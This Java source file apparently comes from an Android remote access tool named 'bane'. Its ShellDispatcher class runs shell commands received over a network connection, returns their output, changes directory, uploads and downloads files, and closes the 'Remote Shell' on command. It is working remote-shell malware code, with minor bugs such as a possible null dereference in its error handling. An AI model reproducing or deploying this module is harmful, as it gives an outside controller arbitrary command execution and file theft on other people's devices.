package com.example.bane.dispatcher;

import android.util.Pair;
import com.bane.model.*;
import com.example.bane.connection.Connection;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ShellDispatcher extends Dispatcher {

    private ProcessBuilder processBuilder;

    public ShellDispatcher(Connection connection) {
        super(connection);
        this.processBuilder = new ProcessBuilder();
    }

    @Override
    public BaneObject dispatch(BaneObject request) {
        String command = ((String)request.values[0].value);
        BaneCode code = BaneCode.ERROR;
        String message = "";
        BaneValue[] values = null;
        if(command.contains("sclose")){
            super.connection.setDispatcher(new DefaultDispatcher(super.connection));
            // set the dispatcher to be the DefaultDispatcher
            code = BaneCode.RESPONSE;
            message = "Closed the Remote Shell";
        } else if(command.contains("cd ")){
                changeDirectory(command);
                code = BaneCode.RESPONSE;
                message = "New directory: "+this.processBuilder.directory().getPath();
        } else if(command.contains("download")){
            return super.download(request);
        } else if(command.contains("upload")){
            return super.upload(request);
        } else {
            List<String> list = new ArrayList<String>();
            Matcher m = Pattern.compile("([^\"]\\S*|\".+?\")\\s*").matcher(command);
            while (m.find())
                list.add(m.group(1));
            ProcessBuilder pro = processBuilder.command(list);
            Pair<String,String> p = null;
            try {
                p = readShellStream(pro.start());
                message = p.second;
                values = new BaneValue[]{
                        new BaneValue<String>("response",p.first)
                };
            } catch (Exception e) {
                message = p.second;
            }
        }
        return new BaneObject(code,message,values);
    }

    private Pair<String, String> readShellStream(Process process) throws Exception {
        int read;
        String output = "";
        String error = "";
        while (true) {
            read = process.getInputStream().read();
            if (read <= 0) {
                break;
            }
            output+= (char) read;
        }
        while (true) {
            read = process.getErrorStream().read();
            if (read <= 0) {
                break;
            }
            output += (char) read;
        }
        return new Pair<String, String>(output,error);
    }

    private void changeDirectory(String command) {
        String path = command.replace("cd ","");
        if(path.equals("/")){
            this.processBuilder.directory(new File("/"));
        } else {
            this.processBuilder.directory(new File("./"+path));
        }
    }

}
